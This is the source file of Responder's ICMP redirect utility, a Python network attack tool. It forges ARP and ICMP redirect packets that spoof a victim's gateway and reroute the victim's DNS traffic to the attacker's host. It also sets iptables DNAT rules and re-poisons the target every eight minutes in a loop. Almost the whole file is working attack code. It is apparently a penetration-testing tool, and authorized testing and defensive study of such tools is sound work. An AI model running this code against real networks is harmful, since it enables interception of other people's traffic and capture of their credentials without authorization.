#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import os
import sys
import socket
import struct
import optparse
import random
import pipes

from random import randrange
from time import sleep
from subprocess import call
from pipes import quote

BASEDIR = os.path.realpath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.insert(0, BASEDIR)
from odict import OrderedDict
from packets import Packet
from utils import *

parser = optparse.OptionParser(usage='python %prog -I eth0 -i 10.20.30.40 -g 10.20.30.254 -t 10.20.30.48 -r 10.20.40.1', prog=sys.argv[0],)
parser.add_option('-I', '--interface',      action="store", help="Interface name to use, example: eth0", metavar="eth0",dest="Interface")
parser.add_option('-g', '--gateway',        action="store", help="The ip address of the original gateway ('route -n' will tell)", metavar="10.20.30.254",dest="OriginalGwAddr")
parser.add_option('-t', '--target',         action="store", help="The ip address of the target", metavar="10.20.30.48",dest="VictimIP")
parser.add_option('-r', '--route',          action="store", help="The ip address of the destination target, example: DNS server. Must be on another subnet.", metavar="10.20.40.1",dest="ToThisHost")
parser.add_option('-s', '--secondaryroute', action="store", help="The ip address of the destination target, example: Secondary DNS server. Must be on another subnet.", metavar="10.20.40.1",dest="ToThisHost2")
parser.add_option('-a', '--alternate',      action="store", help="The alternate gateway, set this option if you wish to redirect the victim traffic to another host than yours", metavar="10.20.30.40",dest="AlternateGwAddr")
options, args = parser.parse_args()

def color(txt, code = 1, modifier = 0):
	return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)

if options.OriginalGwAddr is None:
	print color("[!]", 1, 1), "-g mandatory option is missing, please provide the original gateway address.\n"
	exit(-1)

if options.VictimIP is None:
	print color("[!]", 1, 1), "-t mandatory option is missing, please provide a target.\n"
	exit(-1)

if options.Interface is None:
	print color("[!]", 1, 1), "-I mandatory option is missing, please provide your network interface.\n"
	exit(-1)

if options.ToThisHost is None:
	print color("[!]", 1, 1), "r mandatory option is missing, please provide a destination target.\n"
	exit(-1)

if options.AlternateGwAddr is None:
	AlternateGwAddr = FindLocalIP(Interface)

Responder_IP    = FindLocalIP(Interface)
OriginalGwAddr  = options.OriginalGwAddr
AlternateGwAddr = options.AlternateGwAddr
VictimIP        = options.VictimIP
ToThisHost      = options.ToThisHost
ToThisHost2     = options.ToThisHost2
Interface       = options.Interface

print '###########################################################################'
print '##                      ICMP REDIRECT UTILITY 0.1                        ##'
print '##                                                                       ##'
print '##   This utility combined with Responder is useful on Windows networks  ##'
print '##      Most Linux distributions discard by default ICMP Redirects.      ##'
print '##                                                                       ##'
print '##     Note that if the target is Windows, the poisoning will only       ##'
print '##    last for 10mn, you can re-poison the target by launching this      ##'
print '##  utility again.  If you wish to respond to the traffic, for example   ##'
print '##   to DNS queries issued by the target, run these commands as root:    ##'
print '##                                                                       ##'
print '##    *  iptables -A OUTPUT -p ICMP -j DROP                              ##'
print '##    *  iptables -t nat -A PREROUTING -p udp --dst %s                   ##' % ToThisHost
print '##       --dport 53 -j DNAT --to-destination %s:53                       ##' % Responder_IP
print '###########################################################################'
print ''

def GenCheckSum(data):
	s = 0
	for i in range(0, len(data), 2):
		q = ord(data[i]) + (ord(data[i+1]) << 8)
		f = s+q
		s = (f & 0xffff) + (f >> 16)
	return struct.pack("<H",~s & 0xffff)

#####################################################################
#ARP Packets
#####################################################################
class EthARP(Packet):
	fields = OrderedDict([
		("DstMac", "\xff\xff\xff\xff\xff\xff"),
		("SrcMac", ""),
		("Type", "\x08\x06" ), #ARP
	])

class ARPWhoHas(Packet):
	fields = OrderedDict([
		("HwType",    "\x00\x01"),
		("ProtoType", "\x08\x00" ), #IP
		("MacLen",    "\x06"),
		("IPLen",     "\x04"),
		("OpCode",    "\x00\x01"),
		("SenderMac", ""),
		("SenderIP",  "\x00\xff\x53\x4d"),
		("DstMac",    "\x00\x00\x00\x00\x00\x00"),
		("DstIP",     "\x00\x00\x00\x00"),
	])

	def calculate(self):
		self.fields["DstIP"] = inet_aton(self.fields["DstIP"])
		self.fields["SenderIP"] = inet_aton(Responder_IP)

#####################################################################
#ICMP Redirect Packets
#####################################################################
class Eth2(Packet):
	fields = OrderedDict([
		("DstMac", ""),
		("SrcMac", ""),
		("Type", "\x08\x00" ), #IP
	])

class IPPacket(Packet):
	fields = OrderedDict([
		("VLen",       "\x45"),
		("DifField",   "\x00"),
		("Len",        "\x00\x38"),
		("TID",        "\x25\x25"),
		("Flag",       "\x00"),
		("FragOffset", "\x00"),
		("TTL",        "\x1d"),
		("Cmd",        "\x01"), #ICMP
		("CheckSum",   "\x00\x00"),
		("SrcIP",   ""),
		("DestIP",     ""),
		("Data",       ""),

	])

	def calculate(self):
		self.fields["TID"] = chr(randrange(256))+chr(randrange(256))
		self.fields["SrcIP"] = inet_aton(str(self.fields["SrcIP"]))
		self.fields["DestIP"] = inet_aton(str(self.fields["DestIP"]))
		# Calc Len First
		CalculateLen = str(self.fields["VLen"])+str(self.fields["DifField"])+str(self.fields["Len"])+str(self.fields["TID"])+str(self.fields["Flag"])+str(self.fields["FragOffset"])+str(self.fields["TTL"])+str(self.fields["Cmd"])+str(self.fields["CheckSum"])+str(self.fields["SrcIP"])+str(self.fields["DestIP"])+str(self.fields["Data"])
		self.fields["Len"] = struct.pack(">H", len(CalculateLen))
		# Then CheckSum this packet
		CheckSumCalc =str(self.fields["VLen"])+str(self.fields["DifField"])+str(self.fields["Len"])+str(self.fields["TID"])+str(self.fields["Flag"])+str(self.fields["FragOffset"])+str(self.fields["TTL"])+str(self.fields["Cmd"])+str(self.fields["CheckSum"])+str(self.fields["SrcIP"])+str(self.fields["DestIP"])
		self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)

class ICMPRedir(Packet):
	fields = OrderedDict([
		("Type",       "\x05"),
		("OpCode",     "\x01"),
		("CheckSum",   "\x00\x00"),
		("GwAddr",     ""),
		("Data",       ""),
	])

	def calculate(self):
		#Set the values
		self.fields["GwAddr"] = inet_aton(Responder_IP)
		# Then CheckSum this packet
		CheckSumCalc =str(self.fields["Type"])+str(self.fields["OpCode"])+str(self.fields["CheckSum"])+str(self.fields["GwAddr"])+str(self.fields["Data"])
		self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)

class DummyUDP(Packet):
	fields = OrderedDict([
		("SrcPort",    "\x00\x35"), #port 53
		("DstPort",    "\x00\x35"),
		("Len",        "\x00\x08"), #Always 8 in this case.
		("CheckSum",   "\x00\x00"), #CheckSum disabled.
	])

def ReceiveArpFrame(DstAddr):
	s = socket(AF_PACKET, SOCK_RAW)
	s.settimeout(5)
	Protocol = 0x0806
	s.bind((Interface, Protocol))
	OurMac = s.getsockname()[4]
	Eth = EthARP(SrcMac=OurMac)
	Arp = ARPWhoHas(DstIP=DstAddr,SenderMac=OurMac)
	Arp.calculate()
	final = str(Eth)+str(Arp)
	try:
		s.send(final)
		data = s.recv(1024)
		DstMac = data[22:28]
		DestMac = DstMac.encode('hex')
		PrintMac = ":".join([DestMac[x:x+2] for x in xrange(0, len(DestMac), 2)])
		return PrintMac,DstMac
	except:
		print "[ARP]%s took too long to Respond. Please provide a valid host.\n"%(DstAddr)
		exit(1)

def IcmpRedirectSock(DestinationIP):
	PrintMac,DestMac = ReceiveArpFrame(VictimIP)
	PrintMac,RouterMac = ReceiveArpFrame(OriginalGwAddr)
	s = socket(AF_PACKET, SOCK_RAW)
	s.bind((Interface, 0x0800))

	Eth = Eth2(DstMac=DestMac,SrcMac=RouterMac)
	
	IPPackUDP = IPPacket(Cmd="\x11",SrcIP=VictimIP,DestIP=DestinationIP,TTL="\x40",Data=str(DummyUDP()))
	IPPackUDP.calculate()
	
	ICMPPack = ICMPRedir(GwAddr=AlternateGwAddr,Data=str(IPPackUDP))
	ICMPPack.calculate()
	
	IPPack = IPPacket(SrcIP=OriginalGwAddr,DestIP=VictimIP,TTL="\x40",Data=str(ICMPPack))
	IPPack.calculate()
	
	final = str(Eth)+str(IPPack)
	s.send(final)

	print text("[ICMP-Redir] %s should have been poisoned with a new route for target: %s" % (VictimIP, DestinationIP))

def RunThisInLoop(host, host2, ip):
	dns1 = pipes.quote(host)
	dns2 = pipes.quote(host2)
	Responder_IPadd = pipes.quote(ip)

	call("iptables -A OUTPUT -p ICMP -j DROP")
	call("iptables -t nat -A PREROUTING -p udp --dst "+dns1+" --dport 53 -j DNAT --to-destination "+Responder_IP+":53", shell=True)
	call("iptables -t nat -A PREROUTING -p udp --dst "+dns2+" --dport 53 -j DNAT --to-destination "+Responder_IP+":53", shell=True)
	
	print text("[ICMP-Redir] Automatic mode enabled")
	print text("[ICMP-Redir] IPtables rules added for both DNS Servers")
	
	while True:
		print text("[ICMP-Redir] Poisoning target... Next round in 8 minutes.")
		try:
			IcmpRedirectSock(DestinationIP=dns1)
			IcmpRedirectSock(DestinationIP=dns2)
			sleep(480)

		except KeyboardInterrupt:
			sys.exit("\r%s Exiting..." % color('[*]', 2, 1))

if __name__ == "__main__":
	if ToThisHost2 != None:
		RunThisInLoop(ToThisHost, ToThisHost2,Responder_IP)

	if ToThisHost2 == None:
		print text("[ICMP-Redir] Poisoning target...")
		IcmpRedirectSock(DestinationIP=ToThisHost)
		print text("[ICMP-Redir] Done.")
		exit()
